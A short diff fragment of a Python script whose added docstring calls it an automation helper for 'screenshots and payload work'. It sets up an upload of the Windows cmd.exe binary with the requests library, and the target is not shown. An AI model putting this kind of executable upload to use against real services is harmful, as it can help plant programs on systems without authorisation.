@@ -1,3 +1,5 @@
+"""Generated automation helper script for screenshots and payload work."""
+
 import requests
 
 files = {'file': open('C:\\Windows\\System32\\cmd.exe', 'rb')}
